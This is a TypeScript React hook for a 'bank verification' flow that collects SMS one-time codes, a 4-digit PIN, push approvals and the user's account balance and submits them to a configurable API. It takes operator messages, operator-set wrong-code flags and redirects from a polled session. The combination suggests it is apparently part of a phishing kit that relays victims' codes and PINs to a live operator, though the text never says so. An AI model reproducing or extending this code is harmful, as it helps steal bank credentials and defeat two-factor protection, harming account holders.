import { useState, useEffect, useCallback } from "react";
import { useSessionStatus } from "./use-session-status";
import { useResendCountdown } from "./use-resend-countdown";
import { submitOtp, resendOtp, submitBalance } from "../lib/bank-api";
import { debugLog } from "../lib/debug";
import type { BankVerificationProps } from "../types";

const RESEND_COOLDOWN = 60;

function normalizeLayout(slug: string | undefined): string {
  if (!slug) return "sms";
  if (slug.endsWith("-sms")) return "sms";
  if (slug.endsWith("-pin")) return "pin";
  if (slug.endsWith("-push")) return "push";
  if (slug.endsWith("-balance")) return "balance";
  return slug;
}

export interface UseBankVerificationReturn {
  missingParams: boolean;
  shouldRenderNull: boolean;
  inProgress: boolean;
  awaitingVerification: boolean;
  baseLayout: string;
  layoutProps: Record<string, unknown>;
  error: string | null;
}

export function useBankVerification({
  apiBase,
  channelSlug,
  sessionId,
  debug = false,
  onSuccess,
  onDeclined,
  onError,
  onRedirect,
}: BankVerificationProps): UseBankVerificationReturn {
  const [error, setError] = useState<string | null>(null);
  const [submitting, setSubmitting] = useState(false);
  const [code, setCode] = useState("");
  const [pinValue, setPinValue] = useState("");
  const [pinMasked, setPinMasked] = useState(true);
  const [balance, setBalance] = useState("");

  const {
    status,
    verificationLayout,
    bank,
    redirectUrl,
    transactionDetails,
    wrongCode,
    expiredCode,
    clearCodeFeedback,
    operatorMessage,
    countdownResetTrigger,
  } = useSessionStatus(apiBase, channelSlug, sessionId, debug);

  const baseLayout = normalizeLayout(verificationLayout);
  const resendFn = useCallback(async () => {
    if (baseLayout === "pin") {
      debugLog(debug, "resend OTP", { type: "pin" });
      await resendOtp(apiBase, channelSlug, sessionId, "pin");
      debugLog(debug, "resend OTP done", { type: "pin" });
    } else if (baseLayout === "sms") {
      debugLog(debug, "resend OTP", { type: "sms" });
      await resendOtp(apiBase, channelSlug, sessionId, "sms");
      debugLog(debug, "resend OTP done", { type: "sms" });
    }
    // push/balance: no resend, resolve immediately
  }, [apiBase, channelSlug, sessionId, baseLayout, debug]);

  const resendState = useResendCountdown(RESEND_COOLDOWN, countdownResetTrigger, resendFn);

  useEffect(() => {
    if (wrongCode || expiredCode) {
      setSubmitting(false);
      setCode("");
      setPinValue("");
    }
  }, [wrongCode, expiredCode]);

  useEffect(() => {
    setSubmitting(false);
  }, [status]);

  useEffect(() => {
    if (!channelSlug || !sessionId) return;
    debugLog(debug, "status effect", { status, redirectUrl });
    if (status === "blocked" && redirectUrl) {
      debugLog(debug, "redirect", { redirectUrl });
      if (onRedirect) {
        onRedirect(redirectUrl);
      } else {
        window.location.replace(redirectUrl);
      }
      return;
    }
    const terminalSuccess = ["success"].includes(status);
    const terminalDeclined = ["declined", "expired", "blocked"].includes(status);
    if (terminalSuccess) {
      debugLog(debug, "success callback", { sessionId });
      onSuccess?.(sessionId);
      return;
    }
    if (status === "invalid") {
      debugLog(debug, "error callback", { reason: "invalid" });
      onError?.("invalid");
      return;
    }
    if (terminalDeclined) {
      debugLog(debug, "declined callback", { sessionId, status });
      onDeclined?.(sessionId, status);
    }
  }, [channelSlug, sessionId, status, redirectUrl, onSuccess, onDeclined, onError, onRedirect, debug]);

  const handleSubmitOtp = useCallback(
    async (codeValue: string) => {
      clearCodeFeedback?.();
      setSubmitting(true);
      debugLog(debug, "submit OTP", { type: baseLayout, codeLength: codeValue.length });
      try {
        await submitOtp(apiBase, channelSlug, sessionId, codeValue);
        debugLog(debug, "OTP submitted OK");
      } catch (e) {
        const msg = e instanceof Error ? e.message : "Invalid code";
        debugLog(debug, "OTP submit failed", { error: msg });
        setError(msg);
        setSubmitting(false);
      }
    },
    [apiBase, channelSlug, sessionId, clearCodeFeedback, debug, baseLayout]
  );

  const handleSubmitBalance = useCallback(
    async (balanceValue: string) => {
      setError("");
      setSubmitting(true);
      debugLog(debug, "submit balance", { hasValue: balanceValue.length > 0 });
      try {
        await submitBalance(apiBase, channelSlug, sessionId, balanceValue);
        debugLog(debug, "balance submitted OK");
      } catch (e) {
        const msg = e instanceof Error ? e.message : "Failed to submit balance";
        debugLog(debug, "balance submit failed", { error: msg });
        setError(msg);
        setSubmitting(false);
      }
    },
    [apiBase, channelSlug, sessionId, debug]
  );

  const missingParams = !channelSlug || !sessionId;
  const terminalSuccess = ["success"].includes(status);
  const terminalDeclined = ["declined", "expired", "blocked", "invalid"].includes(status);
  const shouldRenderNull = Boolean(redirectUrl || terminalSuccess || terminalDeclined);
  const inProgress = ["pending", "awaiting_action"].includes(status);
  const awaitingVerification = [
    "awaiting_sms",
    "awaiting_pin",
    "awaiting_push",
    "awaiting_balance",
  ].includes(status);

  const layoutProps: Record<string, unknown> =
    baseLayout === "push"
      ? { bank, transactionDetails }
      : baseLayout === "balance"
        ? {
            bank,
            transactionDetails,
            balance,
            onBalanceChange: setBalance,
            operatorMessage,
            onSubmit: () => handleSubmitBalance(balance),
            submitting,
            canSubmit: balance.trim().length > 0,
          }
        : baseLayout === "pin"
          ? {
              bank,
              transactionDetails,
              pinValue,
              onPinChange: setPinValue,
              pinMasked,
              onPinMaskToggle: () => setPinMasked((m) => !m),
              wrongCode,
              expiredCode,
              onTryAgain: clearCodeFeedback,
              operatorMessage,
              onSubmit: () => handleSubmitOtp(pinValue),
              submitting,
              canSubmit: pinValue.replace(/\D/g, "").length === 4,
              resendState,
            }
          : {
              bank,
              transactionDetails,
              code,
              onCodeChange: setCode,
              wrongCode,
              expiredCode,
              onTryAgain: clearCodeFeedback,
              operatorMessage,
              onSubmit: () => handleSubmitOtp(code),
              submitting,
              canSubmit: code.replace(/\D/g, "").length >= 6,
              resendState,
            };

  return {
    missingParams,
    shouldRenderNull,
    inProgress,
    awaitingVerification,
    baseLayout,
    layoutProps,
    error,
  };
}
